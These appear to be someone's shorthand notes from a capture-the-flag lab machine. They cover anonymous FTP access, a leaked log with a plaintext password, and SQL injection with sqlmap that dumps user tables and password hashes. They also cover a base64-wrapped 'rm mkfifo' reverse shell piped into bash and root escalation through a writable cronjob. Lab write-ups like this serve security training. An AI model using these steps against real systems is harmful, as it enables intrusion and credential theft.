ftp enum gave flag and some files #anonymous login (no password required!)
21/tcp   open  ftp
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

http-enum showed logs folder which had post_log.log 
'email' : Daedalus | 'password' : g2e55kh4ck5r
search api vulnerable to sqlmap
idCreature | nameCreature | passwordCreature                 | permissionCreature |
+------------+--------------+----------------------------------+--------------------+
| 1          | Cerberos     | 3898e56bf6fa6ddfc3c0977c514a65a8 | user               |
| 2          | Pegasus      | 5d20441c392b68c61592b2159990abfe | user               |
| 3          | Chiron       | f847149233ae29ec0e1fcf052930c044 | user               |
| 4          | Centaurus    | ea5540126c33fe653bf56e7a686b1770 | user               |
+------------+--------------+----------------------------------+--------------------+

idPeople   | namePeople   | passwordPeople                   | permissionPeople | passwords |
+----------+--------------+----------------------------------+------------------+-----------+
| 1        | Eurycliedes  | 42354020b68c7ed28dcdeabd5a2baf8e | user             | 
| 2        | Menekrates   | 0b3bebe266a81fbfaa79db1604c4e67f | user             |
| 3        | Philostratos | b83f966a6f5a9cff9c6e1c52b0aa635b | user             |
| 4        | Daedalus     | b8e4c23686a3a12476ad7779e35f5eb6 | user             |
| 5        | M!n0taur     | 1765db9457f496a39859209ee81fbda4 | admin            | aminotauro

logging in as admin user shows flag2

base64 encode the rm mkfifo shell
<base64 encode> | base64 -d | bash

for root, there is cronjob running as root with a writable script(yeh, too easy but looked it up, too lazy to enumerate properly, ig)


